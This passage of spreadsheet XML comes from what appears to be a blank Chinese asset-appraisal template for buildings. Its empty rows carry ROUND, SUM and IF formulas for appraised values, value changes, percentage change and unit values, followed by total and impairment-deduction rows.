      <c r="R6" s="594" t="n"/>
      <c r="S6" s="594" t="n"/>
    </row>
    <row r="7" ht="18" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="284" t="n"/>
      <c r="D7" s="323" t="n"/>
      <c r="E7" s="284" t="n"/>
      <c r="F7" s="587" t="n"/>
      <c r="G7" s="284" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="inlineStr"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="380" t="n"/>
      <c r="N7" s="555">
        <f>ROUND(L7*M7/100,-2)</f>
        <v/>
      </c>
      <c r="O7" s="555">
        <f>L7-J7</f>
        <v/>
      </c>
      <c r="P7" s="555">
        <f>N7-K7</f>
        <v/>
      </c>
      <c r="Q7" s="555">
        <f>IF(K7=0,"",ROUND(P7/K7*100,2))</f>
        <v/>
      </c>
      <c r="R7" s="555">
        <f>IF(H7=0,"",ROUND(L7/H7,0))</f>
        <v/>
      </c>
      <c r="S7" s="213" t="n"/>
    </row>
    <row r="8" ht="18" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="284" t="n"/>
      <c r="D8" s="323" t="n"/>
      <c r="E8" s="284" t="n"/>
      <c r="F8" s="587" t="n"/>
      <c r="G8" s="284" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="inlineStr"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="380" t="n"/>
      <c r="N8" s="555">
        <f>ROUND(L8*M8/100,-2)</f>
        <v/>
      </c>
      <c r="O8" s="555">
        <f>L8-J8</f>
        <v/>
      </c>
      <c r="P8" s="555">
        <f>N8-K8</f>
        <v/>
      </c>
      <c r="Q8" s="555">
        <f>IF(K8=0,"",ROUND(P8/K8*100,2))</f>
        <v/>
      </c>
      <c r="R8" s="555">
        <f>IF(H8=0,"",ROUND(L8/H8,0))</f>
        <v/>
      </c>
      <c r="S8" s="213" t="n"/>
    </row>
    <row r="9" ht="18" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="284" t="n"/>
      <c r="D9" s="323" t="n"/>
      <c r="E9" s="284" t="n"/>
      <c r="F9" s="587" t="n"/>
      <c r="G9" s="284" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="inlineStr"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="380" t="n"/>
      <c r="N9" s="555">
        <f>ROUND(L9*M9/100,-2)</f>
        <v/>
      </c>
      <c r="O9" s="555">
        <f>L9-J9</f>
        <v/>
      </c>
      <c r="P9" s="555">
        <f>N9-K9</f>
        <v/>
      </c>
      <c r="Q9" s="555">
        <f>IF(K9=0,"",ROUND(P9/K9*100,2))</f>
        <v/>
      </c>
      <c r="R9" s="555">
        <f>IF(H9=0,"",ROUND(L9/H9,0))</f>
        <v/>
      </c>
      <c r="S9" s="213" t="n"/>
    </row>
    <row r="10" ht="18" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="284" t="n"/>
      <c r="D10" s="323" t="n"/>
      <c r="E10" s="284" t="n"/>
      <c r="F10" s="587" t="n"/>
      <c r="G10" s="284" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="380" t="n"/>
      <c r="N10" s="555">
        <f>ROUND(L10*M10/100,-2)</f>
        <v/>
      </c>
      <c r="O10" s="555">
        <f>L10-J10</f>
        <v/>
      </c>
      <c r="P10" s="555">
        <f>N10-K10</f>
        <v/>
      </c>
      <c r="Q10" s="555">
        <f>IF(K10=0,"",ROUND(P10/K10*100,2))</f>
        <v/>
      </c>
      <c r="R10" s="555">
        <f>IF(H10=0,"",ROUND(L10/H10,0))</f>
        <v/>
      </c>
      <c r="S10" s="213" t="n"/>
    </row>
    <row r="11" ht="18" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="284" t="n"/>
      <c r="D11" s="284" t="n"/>
      <c r="E11" s="284" t="n"/>
      <c r="F11" s="587" t="n"/>
      <c r="G11" s="284" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="380" t="n"/>
      <c r="N11" s="555">
        <f>ROUND(L11*M11/100,-2)</f>
        <v/>
      </c>
      <c r="O11" s="555">
        <f>L11-J11</f>
        <v/>
      </c>
      <c r="P11" s="555">
        <f>N11-K11</f>
        <v/>
      </c>
      <c r="Q11" s="555">
        <f>IF(K11=0,"",ROUND(P11/K11*100,2))</f>
        <v/>
      </c>
      <c r="R11" s="555">
        <f>IF(H11=0,"",ROUND(L11/H11,0))</f>
        <v/>
      </c>
      <c r="S11" s="213" t="n"/>
    </row>
    <row r="12" ht="18" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="284" t="n"/>
      <c r="D12" s="284" t="n"/>
      <c r="E12" s="284" t="n"/>
      <c r="F12" s="587" t="n"/>
      <c r="G12" s="284" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="380" t="n"/>
      <c r="N12" s="555">
        <f>ROUND(L12*M12/100,-2)</f>
        <v/>
      </c>
      <c r="O12" s="555">
        <f>L12-J12</f>
        <v/>
      </c>
      <c r="P12" s="555">
        <f>N12-K12</f>
        <v/>
      </c>
      <c r="Q12" s="555">
        <f>IF(K12=0,"",ROUND(P12/K12*100,2))</f>
        <v/>
      </c>
      <c r="R12" s="555">
        <f>IF(H12=0,"",ROUND(L12/H12,0))</f>
        <v/>
      </c>
      <c r="S12" s="213" t="n"/>
    </row>
    <row r="13" ht="18" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="284" t="n"/>
      <c r="D13" s="284" t="n"/>
      <c r="E13" s="284" t="n"/>
      <c r="F13" s="587" t="n"/>
      <c r="G13" s="284" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="380" t="n"/>
      <c r="N13" s="555">
        <f>ROUND(L13*M13/100,-2)</f>
        <v/>
      </c>
      <c r="O13" s="555">
        <f>L13-J13</f>
        <v/>
      </c>
      <c r="P13" s="555">
        <f>N13-K13</f>
        <v/>
      </c>
      <c r="Q13" s="555">
        <f>IF(K13=0,"",ROUND(P13/K13*100,2))</f>
        <v/>
      </c>
      <c r="R13" s="555">
        <f>IF(H13=0,"",ROUND(L13/H13,0))</f>
        <v/>
      </c>
      <c r="S13" s="213" t="n"/>
    </row>
    <row r="14" ht="18" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="284" t="n"/>
      <c r="D14" s="284" t="n"/>
      <c r="E14" s="284" t="n"/>
      <c r="F14" s="587" t="n"/>
      <c r="G14" s="284" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="380" t="n"/>
      <c r="N14" s="555">
        <f>ROUND(L14*M14/100,-2)</f>
        <v/>
      </c>
      <c r="O14" s="555">
        <f>L14-J14</f>
        <v/>
      </c>
      <c r="P14" s="555">
        <f>N14-K14</f>
        <v/>
      </c>
      <c r="Q14" s="555">
        <f>IF(K14=0,"",ROUND(P14/K14*100,2))</f>
        <v/>
      </c>
      <c r="R14" s="555">
        <f>IF(H14=0,"",ROUND(L14/H14,0))</f>
        <v/>
      </c>
      <c r="S14" s="213" t="n"/>
    </row>
    <row r="15" ht="18" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="284" t="n"/>
      <c r="D15" s="284" t="n"/>
      <c r="E15" s="284" t="n"/>
      <c r="F15" s="587" t="n"/>
      <c r="G15" s="284" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="380" t="n"/>
      <c r="N15" s="555">
        <f>ROUND(L15*M15/100,-2)</f>
        <v/>
      </c>
      <c r="O15" s="555">
        <f>L15-J15</f>
        <v/>
      </c>
      <c r="P15" s="555">
        <f>N15-K15</f>
        <v/>
      </c>
      <c r="Q15" s="555">
        <f>IF(K15=0,"",ROUND(P15/K15*100,2))</f>
        <v/>
      </c>
      <c r="R15" s="555">
        <f>IF(H15=0,"",ROUND(L15/H15,0))</f>
        <v/>
      </c>
      <c r="S15" s="213" t="n"/>
    </row>
    <row r="16" ht="18" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="284" t="n"/>
      <c r="D16" s="284" t="n"/>
      <c r="E16" s="284" t="n"/>
      <c r="F16" s="587" t="n"/>
      <c r="G16" s="284" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="380" t="n"/>
      <c r="N16" s="555">
        <f>ROUND(L16*M16/100,-2)</f>
        <v/>
      </c>
      <c r="O16" s="555">
        <f>L16-J16</f>
        <v/>
      </c>
      <c r="P16" s="555">
        <f>N16-K16</f>
        <v/>
      </c>
      <c r="Q16" s="555">
        <f>IF(K16=0,"",ROUND(P16/K16*100,2))</f>
        <v/>
      </c>
      <c r="R16" s="555">
        <f>IF(H16=0,"",ROUND(L16/H16,0))</f>
        <v/>
      </c>
      <c r="S16" s="213" t="n"/>
    </row>
    <row r="17" ht="18" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="284" t="n"/>
      <c r="D17" s="284" t="n"/>
      <c r="E17" s="284" t="n"/>
      <c r="F17" s="587" t="n"/>
      <c r="G17" s="284" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="380" t="n"/>
      <c r="N17" s="555">
        <f>ROUND(L17*M17/100,-2)</f>
        <v/>
      </c>
      <c r="O17" s="555">
        <f>L17-J17</f>
        <v/>
      </c>
      <c r="P17" s="555">
        <f>N17-K17</f>
        <v/>
      </c>
      <c r="Q17" s="555">
        <f>IF(K17=0,"",ROUND(P17/K17*100,2))</f>
        <v/>
      </c>
      <c r="R17" s="555">
        <f>IF(H17=0,"",ROUND(L17/H17,0))</f>
        <v/>
      </c>
      <c r="S17" s="213" t="n"/>
    </row>
    <row r="18" ht="18" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="284" t="n"/>
      <c r="D18" s="284" t="n"/>
      <c r="E18" s="284" t="n"/>
      <c r="F18" s="587" t="n"/>
      <c r="G18" s="284" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="380" t="n"/>
      <c r="N18" s="555">
        <f>ROUND(L18*M18/100,-2)</f>
        <v/>
      </c>
      <c r="O18" s="555">
        <f>L18-J18</f>
        <v/>
      </c>
      <c r="P18" s="555">
        <f>N18-K18</f>
        <v/>
      </c>
      <c r="Q18" s="555">
        <f>IF(K18=0,"",ROUND(P18/K18*100,2))</f>
        <v/>
      </c>
      <c r="R18" s="555">
        <f>IF(H18=0,"",ROUND(L18/H18,0))</f>
        <v/>
      </c>
      <c r="S18" s="213" t="n"/>
    </row>
    <row r="19" ht="18" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="284" t="n"/>
      <c r="D19" s="284" t="n"/>
      <c r="E19" s="284" t="n"/>
      <c r="F19" s="587" t="n"/>
      <c r="G19" s="284" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="380" t="n"/>
      <c r="N19" s="555">
        <f>ROUND(L19*M19/100,-2)</f>
        <v/>
      </c>
      <c r="O19" s="555">
        <f>L19-J19</f>
        <v/>
      </c>
      <c r="P19" s="555">
        <f>N19-K19</f>
        <v/>
      </c>
      <c r="Q19" s="555">
        <f>IF(K19=0,"",ROUND(P19/K19*100,2))</f>
        <v/>
      </c>
      <c r="R19" s="555">
        <f>IF(H19=0,"",ROUND(L19/H19,0))</f>
        <v/>
      </c>
      <c r="S19" s="213" t="n"/>
    </row>
    <row r="20" ht="18" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="284" t="n"/>
      <c r="D20" s="284" t="n"/>
      <c r="E20" s="284" t="n"/>
      <c r="F20" s="587" t="n"/>
      <c r="G20" s="284" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="380" t="n"/>
      <c r="N20" s="555">
        <f>ROUND(L20*M20/100,-2)</f>
        <v/>
      </c>
      <c r="O20" s="555">
        <f>L20-J20</f>
        <v/>
      </c>
      <c r="P20" s="555">
        <f>N20-K20</f>
        <v/>
      </c>
      <c r="Q20" s="555">
        <f>IF(K20=0,"",ROUND(P20/K20*100,2))</f>
        <v/>
      </c>
      <c r="R20" s="555">
        <f>IF(H20=0,"",ROUND(L20/H20,0))</f>
        <v/>
      </c>
      <c r="S20" s="213" t="n"/>
    </row>
    <row r="21" ht="18" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="284" t="n"/>
      <c r="D21" s="284" t="n"/>
      <c r="E21" s="284" t="n"/>
      <c r="F21" s="587" t="n"/>
      <c r="G21" s="284" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="380" t="n"/>
      <c r="N21" s="555">
        <f>ROUND(L21*M21/100,-2)</f>
        <v/>
      </c>
      <c r="O21" s="555">
        <f>L21-J21</f>
        <v/>
      </c>
      <c r="P21" s="555">
        <f>N21-K21</f>
        <v/>
      </c>
      <c r="Q21" s="555">
        <f>IF(K21=0,"",ROUND(P21/K21*100,2))</f>
        <v/>
      </c>
      <c r="R21" s="555">
        <f>IF(H21=0,"",ROUND(L21/H21,0))</f>
        <v/>
      </c>
      <c r="S21" s="213" t="n"/>
    </row>
    <row r="22" ht="18" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="284" t="n"/>
      <c r="D22" s="284" t="n"/>
      <c r="E22" s="284" t="n"/>
      <c r="F22" s="587" t="n"/>
      <c r="G22" s="284" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="380" t="n"/>
      <c r="N22" s="555">
        <f>ROUND(L22*M22/100,-2)</f>
        <v/>
      </c>
      <c r="O22" s="555">
        <f>L22-J22</f>
        <v/>
      </c>
      <c r="P22" s="555">
        <f>N22-K22</f>
        <v/>
      </c>
      <c r="Q22" s="555">
        <f>IF(K22=0,"",ROUND(P22/K22*100,2))</f>
        <v/>
      </c>
      <c r="R22" s="555">
        <f>IF(H22=0,"",ROUND(L22/H22,0))</f>
        <v/>
      </c>
      <c r="S22" s="213" t="n"/>
    </row>
    <row r="23" ht="18" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="284" t="n"/>
      <c r="D23" s="284" t="n"/>
      <c r="E23" s="284" t="n"/>
      <c r="F23" s="587" t="n"/>
      <c r="G23" s="284" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="380" t="n"/>
      <c r="N23" s="555">
        <f>ROUND(L23*M23/100,-2)</f>
        <v/>
      </c>
      <c r="O23" s="555">
        <f>L23-J23</f>
        <v/>
      </c>
      <c r="P23" s="555">
        <f>N23-K23</f>
        <v/>
      </c>
      <c r="Q23" s="555">
        <f>IF(K23=0,"",ROUND(P23/K23*100,2))</f>
        <v/>
      </c>
      <c r="R23" s="555">
        <f>IF(H23=0,"",ROUND(L23/H23,0))</f>
        <v/>
      </c>
      <c r="S23" s="213" t="n"/>
    </row>
    <row r="24" ht="18" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="284" t="n"/>
      <c r="D24" s="284" t="n"/>
      <c r="E24" s="284" t="n"/>
      <c r="F24" s="587" t="n"/>
      <c r="G24" s="284" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="380" t="n"/>
      <c r="N24" s="555">
        <f>ROUND(L24*M24/100,-2)</f>
        <v/>
      </c>
      <c r="O24" s="555">
        <f>L24-J24</f>
        <v/>
      </c>
      <c r="P24" s="555">
        <f>N24-K24</f>
        <v/>
      </c>
      <c r="Q24" s="555">
        <f>IF(K24=0,"",ROUND(P24/K24*100,2))</f>
        <v/>
      </c>
      <c r="R24" s="555">
        <f>IF(H24=0,"",ROUND(L24/H24,0))</f>
        <v/>
      </c>
      <c r="S24" s="213" t="n"/>
    </row>
    <row r="25" ht="18" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="284" t="n"/>
      <c r="D25" s="284" t="n"/>
      <c r="E25" s="284" t="n"/>
      <c r="F25" s="587" t="n"/>
      <c r="G25" s="284" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="380" t="n"/>
      <c r="N25" s="555">
        <f>ROUND(L25*M25/100,-2)</f>
        <v/>
      </c>
      <c r="O25" s="555">
        <f>L25-J25</f>
        <v/>
      </c>
      <c r="P25" s="555">
        <f>N25-K25</f>
        <v/>
      </c>
      <c r="Q25" s="555">
        <f>IF(K25=0,"",ROUND(P25/K25*100,2))</f>
        <v/>
      </c>
      <c r="R25" s="555">
        <f>IF(H25=0,"",ROUND(L25/H25,0))</f>
        <v/>
      </c>
      <c r="S25" s="213" t="n"/>
    </row>
    <row r="26" ht="18" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="284" t="n"/>
      <c r="D26" s="284" t="n"/>
      <c r="E26" s="284" t="n"/>
      <c r="F26" s="587" t="n"/>
      <c r="G26" s="284" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="inlineStr"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="380" t="n"/>
      <c r="N26" s="555">
        <f>ROUND(L26*M26/100,-2)</f>
        <v/>
      </c>
      <c r="O26" s="555">
        <f>L26-J26</f>
        <v/>
      </c>
      <c r="P26" s="555">
        <f>N26-K26</f>
        <v/>
      </c>
      <c r="Q26" s="555">
        <f>IF(K26=0,"",ROUND(P26/K26*100,2))</f>
        <v/>
      </c>
      <c r="R26" s="555">
        <f>IF(H26=0,"",ROUND(L26/H26,0))</f>
        <v/>
      </c>
      <c r="S26" s="213" t="n"/>
    </row>
    <row r="27" ht="18" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="284" t="n"/>
      <c r="D27" s="284" t="n"/>
      <c r="E27" s="284" t="n"/>
      <c r="F27" s="587" t="n"/>
      <c r="G27" s="284" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555" t="inlineStr"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555" t="n"/>
      <c r="M27" s="380" t="n"/>
      <c r="N27" s="555">
        <f>ROUND(L27*M27/100,-2)</f>
        <v/>
      </c>
      <c r="O27" s="555">
        <f>L27-J27</f>
        <v/>
      </c>
      <c r="P27" s="555">
        <f>N27-K27</f>
        <v/>
      </c>
      <c r="Q27" s="555">
        <f>IF(K27=0,"",ROUND(P27/K27*100,2))</f>
        <v/>
      </c>
      <c r="R27" s="555">
        <f>IF(H27=0,"",ROUND(L27/H27,0))</f>
        <v/>
      </c>
      <c r="S27" s="213" t="n"/>
    </row>
    <row r="28" ht="18" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="284" t="n"/>
      <c r="D28" s="284" t="n"/>
      <c r="E28" s="284" t="n"/>
      <c r="F28" s="587" t="n"/>
      <c r="G28" s="284" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="inlineStr"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555" t="n"/>
      <c r="M28" s="380" t="n"/>
      <c r="N28" s="555">
        <f>ROUND(L28*M28/100,-2)</f>
        <v/>
      </c>
      <c r="O28" s="555">
        <f>L28-J28</f>
        <v/>
      </c>
      <c r="P28" s="555">
        <f>N28-K28</f>
        <v/>
      </c>
      <c r="Q28" s="555">
        <f>IF(K28=0,"",ROUND(P28/K28*100,2))</f>
        <v/>
      </c>
      <c r="R28" s="555">
        <f>IF(H28=0,"",ROUND(L28/H28,0))</f>
        <v/>
      </c>
      <c r="S28" s="213" t="n"/>
    </row>
    <row r="29" ht="18" customHeight="1" s="415">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="284" t="n"/>
      <c r="D29" s="284" t="n"/>
      <c r="E29" s="284" t="n"/>
      <c r="F29" s="587" t="n"/>
      <c r="G29" s="284" t="n"/>
      <c r="H29" s="555" t="n"/>
      <c r="I29" s="555" t="inlineStr"/>
      <c r="J29" s="555" t="n"/>
      <c r="K29" s="555" t="n"/>
      <c r="L29" s="555" t="n"/>
      <c r="M29" s="380" t="n"/>
      <c r="N29" s="555">
        <f>ROUND(L29*M29/100,-2)</f>
        <v/>
      </c>
      <c r="O29" s="555">
        <f>L29-J29</f>
        <v/>
      </c>
      <c r="P29" s="555">
        <f>N29-K29</f>
        <v/>
      </c>
      <c r="Q29" s="555">
        <f>IF(K29=0,"",ROUND(P29/K29*100,2))</f>
        <v/>
      </c>
      <c r="R29" s="555">
        <f>IF(H29=0,"",ROUND(L29/H29,0))</f>
        <v/>
      </c>
      <c r="S29" s="213" t="n"/>
    </row>
    <row r="30" ht="18" customHeight="1" s="415">
      <c r="A30" s="116" t="n"/>
      <c r="B30" s="380" t="n"/>
      <c r="C30" s="284" t="n"/>
      <c r="D30" s="284" t="n"/>
      <c r="E30" s="284" t="n"/>
      <c r="F30" s="587" t="n"/>
      <c r="G30" s="284" t="n"/>
      <c r="H30" s="555" t="n"/>
      <c r="I30" s="555" t="inlineStr"/>
      <c r="J30" s="555" t="n"/>
      <c r="K30" s="555" t="n"/>
      <c r="L30" s="555" t="n"/>
      <c r="M30" s="380" t="n"/>
      <c r="N30" s="555">
        <f>ROUND(L30*M30/100,-2)</f>
        <v/>
      </c>
      <c r="O30" s="555">
        <f>L30-J30</f>
        <v/>
      </c>
      <c r="P30" s="555">
        <f>N30-K30</f>
        <v/>
      </c>
      <c r="Q30" s="555">
        <f>IF(K30=0,"",ROUND(P30/K30*100,2))</f>
        <v/>
      </c>
      <c r="R30" s="555">
        <f>IF(H30=0,"",ROUND(L30/H30,0))</f>
        <v/>
      </c>
      <c r="S30" s="213" t="n"/>
    </row>
    <row r="31" ht="18" customHeight="1" s="415">
      <c r="A31" s="116" t="n"/>
      <c r="B31" s="380" t="n"/>
      <c r="C31" s="284" t="n"/>
      <c r="D31" s="284" t="n"/>
      <c r="E31" s="284" t="n"/>
      <c r="F31" s="587" t="n"/>
      <c r="G31" s="284" t="n"/>
      <c r="H31" s="555" t="n"/>
      <c r="I31" s="555" t="inlineStr"/>
      <c r="J31" s="555" t="n"/>
      <c r="K31" s="555" t="n"/>
      <c r="L31" s="555" t="n"/>
      <c r="M31" s="380" t="n"/>
      <c r="N31" s="555">
        <f>ROUND(L31*M31/100,-2)</f>
        <v/>
      </c>
      <c r="O31" s="555">
        <f>L31-J31</f>
        <v/>
      </c>
      <c r="P31" s="555">
        <f>N31-K31</f>
        <v/>
      </c>
      <c r="Q31" s="555">
        <f>IF(K31=0,"",ROUND(P31/K31*100,2))</f>
        <v/>
      </c>
      <c r="R31" s="555">
        <f>IF(H31=0,"",ROUND(L31/H31,0))</f>
        <v/>
      </c>
      <c r="S31" s="213" t="n"/>
    </row>
    <row r="32" ht="18" customHeight="1" s="415">
      <c r="A32" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B32" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C32" s="593" t="n"/>
      <c r="D32" s="567" t="n"/>
      <c r="E32" s="380" t="n"/>
      <c r="F32" s="115" t="n"/>
      <c r="G32" s="115" t="n"/>
      <c r="H32" s="555">
        <f>SUM(H7:H31)</f>
        <v/>
      </c>
      <c r="I32" s="555" t="n"/>
      <c r="J32" s="555">
        <f>SUM(J7:J31)</f>
        <v/>
      </c>
      <c r="K32" s="555">
        <f>SUM(K7:K31)</f>
        <v/>
      </c>
      <c r="L32" s="555">
        <f>SUM(L7:L31)</f>
        <v/>
      </c>
      <c r="M32" s="380" t="n"/>
      <c r="N32" s="555">
        <f>SUM(N7:N31)</f>
        <v/>
      </c>
      <c r="O32" s="555">
        <f>L32-J32</f>
        <v/>
      </c>
      <c r="P32" s="555">
        <f>N32-K32</f>
        <v/>
      </c>
      <c r="Q32" s="555">
        <f>IF(K32=0,"",ROUND(P32/K32*100,2))</f>
        <v/>
      </c>
      <c r="R32" s="555">
        <f>IF(H32=0,"",ROUND(L32/H32,0))</f>
        <v/>
      </c>
      <c r="S32" s="213" t="n"/>
      <c r="T32" s="410">
        <f>SUM(T7:T31)</f>
        <v/>
      </c>
    </row>
    <row r="33" ht="18" customHeight="1" s="415">
      <c r="A33" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B33" s="284" t="inlineStr">
        <is>
          <t>减：房屋建筑物减值准备</t>
        </is>
      </c>
      <c r="C33" s="593" t="n"/>
      <c r="D33" s="567" t="n"/>
      <c r="E33" s="565" t="n"/>
      <c r="F33" s="565" t="n"/>
      <c r="G33" s="565" t="n"/>
      <c r="H33" s="555" t="n"/>
      <c r="I33" s="555" t="n"/>
      <c r="J33" s="555" t="n"/>
      <c r="K33" s="555" t="n"/>
      <c r="L33" s="555" t="n"/>
      <c r="M33" s="380" t="n"/>
      <c r="N33" s="555" t="n"/>
      <c r="O33" s="555">
        <f>L33-J33</f>
        <v/>
      </c>
      <c r="P33" s="555">
        <f>N33-K33</f>
        <v/>
      </c>
      <c r="Q33" s="555">
        <f>IF(K33=0,"",ROUND(P33/K33*100,2))</f>
        <v/>
      </c>
      <c r="R33" s="555">
        <f>IF(H33=0,"",ROUND(L33/H33,0))</f>
        <v/>
      </c>
      <c r="S33" s="211" t="n"/>
      <c r="T33" s="148" t="inlineStr">
        <is>
          <t>校验</t>
        </is>
      </c>
    </row>
    <row r="34" ht="18" customHeight="1" s="415">
      <c r="A34" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B34" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C34" s="593" t="n"/>
      <c r="D34" s="567" t="n"/>
      <c r="E34" s="380" t="n"/>
      <c r="F34" s="115" t="n"/>
      <c r="G34" s="115" t="n"/>
      <c r="H34" s="555">
        <f>H32-H33</f>
        <v/>
      </c>
      <c r="I34" s="555" t="n"/>
      <c r="J34" s="555">
        <f>J32-J33</f>
        <v/>
      </c>
      <c r="K34" s="555">
        <f>K32-K33</f>
        <v/>
